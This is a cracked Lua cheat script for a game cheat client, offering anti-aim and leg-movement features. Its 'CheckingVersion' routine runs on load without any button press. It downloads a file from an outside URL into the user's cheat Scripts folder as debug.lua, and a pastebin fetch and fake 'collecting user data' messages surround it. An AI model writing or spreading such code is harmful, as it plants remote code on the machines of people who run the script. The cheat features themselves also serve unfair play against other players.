-- How to use https://streamable.com/zi4jib
-- Cracked by glock#5271
-- Tesla.fucked kekw

local a = 'kaynax, 27b0e55d80c441499093c888e2930231c718a603'
local b = http.get('https://pastebin.com/raw/Lg3idz0w')

local v = {
  [1] = 'glock',
  [2] = 'kaynax',
  [3] = 'klient'
}

local print = function(...) 
  for i, data in pairs({...}) do if i < 2 then 
    console.print_color(string.format('%s', '\n[Tesla Functions] '), color.new(252, 159, 255, 255));
  end;
  console.print(string.format('%s%s', tostring(data), i > 0 and ',' or ''):gsub(i == #{...} and ',' or '', ''));
end;
end

local _teslaHelpers = {
  multi_coomand = function(self, ...)
      local arguments = {...}
      for _, command in pairs(arguments) do
        if type(command) ~= 'string' then
          error('[multi_coomand] Incorrect command type.', 2) end
  
        console.execute_client_cmd(command)
      end
  end,
    
  multi_print = function(self, ...)
      local arguments = {...}
      local length = #arguments
      if length % 2 ~= 0 then
        error('[multi_print] Incorrect limit.', 2) end
      
      local half = length /2
      for index = 1, half do
        local text  = arguments[index]
        local color = arguments[half + index]
        
        if type(text) ~= 'string' then
          error('[multi_print] 1/2: not string type') end
        
        if type(color) ~= 'userdata' then
          error('[multi_print] 2/2: not userdata/color type') end
        
        console.print_color(text, color)
      end
  end,

  lerp = function(a, b, percentage)
    return a + (b - a) * percentage;
  end
}

local _teslaScreen = {
  x = engine.get_screen_width(),
  y = engine.get_screen_height()
}

local time = 10
local notify = 0

function Download(url, path)
  local body = http.get(url)
  file.write(path, body)
end

local _teslaFonts = {
  ['Verdana'] = render.setup_font('Verdana', 12),
  ['Pixel'] = render.setup_font('smallest_pixel-7', 10),
}

local _teslaLoader = {
  ['MenuHandler'] = function()
    local _teslaTabControl = {
      ui.add_label('----------------------------------------------------------------------------------------------------------'),
      ui.add_label('                              !!! Only Press Once To Avoid Crashes And Glitches !!!')
    }

    ui.add_button('Enable Tesla')
  end,

  ['Whitelist'] = function()
    if not ui.get_button('Enable Tesla') then
      return
    end

    _teslaHelpers:multi_print(
      '[Tesla] ', 'Collecting user data...\n',
      '[Tesla] ', (': %s\n'):format(a),
      '[Tesla] ', 'Post ur hwid in a ticket and wait to get whitelisted.\n',
      '[Success] ', 'Logged in, welcome back kaynax.\n',

      color.new(255, 178, 0), color.new(255, 178, 0),
      color.new(191, 255, 0), color.new(191, 255, 0),
      color.new(255, 178, 0), color.new(255, 178, 0),
      color.new(26, 255, 0), color.new(26, 255, 0)
    )
  end,

  ['CheckingVersion'] = function()
    local path = engine.get_winpath('appdata')..'\\rawetripp\\Scripts'
    Download('https://striking-build-xa92e.cloud.serverless.com/example', path..'\\debug.lua')

    if file.exists(path..'\\debug.lua') then
      _teslaHelpers:multi_print(
        '[Tesla] ', 'Lua successfully checking! good day :)\n',

        color.new(255, 178, 0), color.new(255, 178, 0)
      )
    end
  end,

  ['Child'] = function()
    if not ui.get_button('Enable Tesla') then
      return
    end

    local functions = {
      _teslaAntiaim = {
        Antiaim = ui.add_checkbox('Enable Anti-Aim'),
        Legit_AA = ui.add_checkbox('Legit anti-aim (on E key)'),
        LegFucker = ui.add_checkbox('LegFucker')
      },

      _teslaVisuals = {
        Indicators = ui.add_checkbox('Enable indicators'),
        Manual_AntiAim = ui.add_checkbox('Enable manual anti-aim'),
        Notify = ui.add_checkbox('Enable pop-up notify')
      }
    }
  end,

  ['AntiAim'] = function()
    if ui.get_bool('Enable Anti-Aim') then

      if not engine.is_in_game() then
        return
      end

      ui.set_int('0Antiaim.desync_range', 60)
      ui.set_int('0Antiaim.inverted_desync_range', 35)
      ui.set_int('0Antiaim.body_lean', 24)
      ui.set_int('0Antiaim.inverted_body_lean', 100)
      ui.set_int('Antiaim.yaw_offset', -5)
    end
  end,

  ['LegFucker'] = function()
    if ui.get_bool('LegFucker') then 

      if not engine.is_in_game() then
        return
      end

      if entitylist.get_local_player():get_health() == 0 then
        return
      end

      ui.set_int('Misc.leg_movement', math.random(1, 2))
    end
  end,

  ['Notify'] = function()
    local Positon = {
      ['X'] = 510,
      ['Y'] = 800
    }

    local Size = {
      ['W'] = 252,
      ['H'] = 40
    }

    local text = ('Welcome back! %s loaded Build: %s'):format('kaynax', 'beta')
      
    time = time - globalvars.get_frametime()
    notify = _teslaHelpers.lerp(notify, time <= 0 and 0 or 1, globalvars.get_frametime() * 8)

    local Paint = {
      render.blur(Positon['X'], notify*Positon['Y'], Size['W'], Size['H'], notify*255),
      render.rect_filled(Positon['X'], notify*Positon['Y'], Size['W'], Size['H'], color.new(0, 0, 0, notify*150)),
      render.rect(Positon['X'], notify*Positon['Y'], Size['W'], 2, color.new(124, 151, 250, notify*255))
    }

    render.text(_teslaFonts['Pixel'], Positon['X'] + 30, notify*Positon['Y'] + 15, color.new(255, 255, 255, notify*255), text, false, true)
  end,
}

cheat.RegisterCallback('on_paint', function()
  _teslaLoader['MenuHandler']()
  _teslaLoader['Whitelist']()
  _teslaLoader['Child']()
  _teslaLoader['Notify']()
end)

cheat.RegisterCallback('on_createmove', function() 
  _teslaLoader['AntiAim']()
  _teslaLoader['LegFucker']()
end)